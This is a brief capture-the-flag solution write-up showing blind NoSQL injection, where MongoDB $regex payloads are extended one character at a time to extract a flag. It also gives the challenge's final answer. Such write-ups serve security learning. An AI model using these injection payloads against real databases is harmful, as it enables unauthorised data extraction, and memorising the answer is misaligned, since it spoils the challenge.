# Solution

Not sure what other method but I use blind-NoSQL  

`flag: {$regex: "^flag{"}` is success so add one by one character  

`flag: {$regex: "^flag{4"}`  
`flag: {$regex: "^flag{4c"}`  
...
`flag: {$regex: "^flag{4cb8649d9ecb0ec59d1784263602e686}"}`  

Flag:`flag{4cb8649d9ecb0ec59d1784263602e686}`

Solved by: zeqzoq
